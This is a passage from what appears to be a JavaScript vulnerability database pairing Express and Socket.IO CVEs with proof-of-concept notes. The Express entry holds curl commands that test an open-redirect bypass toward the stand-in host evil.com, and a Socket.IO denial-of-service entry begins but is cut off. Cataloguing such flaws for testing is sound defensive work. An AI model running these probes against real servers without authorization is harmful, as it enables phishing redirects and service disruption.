        },
    ],
    'Express': [
        {
            cve: 'CVE-2024-29041', desc: 'Express.js < 4.19.2 open redirect via URL encoding bypass in res.redirect()', severity: 'medium', cvss: 6.1,
            poc: `# POC: Express Open Redirect
# Affected: Express < 4.19.2

# Step 1: Test redirect bypass
curl -v "https://TARGET/redirect?url=//evil.com"
curl -v "https://TARGET/redirect?url=/\\\\evil.com"

# The URL validation in res.redirect() can be bypassed
# with specially crafted URLs

# Fix: Update Express to >= 4.19.2
# Validate redirect URLs against allowlist`
        },
    ],
    'Socket.IO': [
        {
            cve: 'CVE-2024-38355', desc: 'Socket.IO < 4.7.6 denial of service via specially crafted packet that crashes the server', severity: 'high', cvss: 7.5,
            poc: `# POC: Socket.IO DoS
# Affected: Socket.IO < 4.7.6

# Send malformed packet to crash server
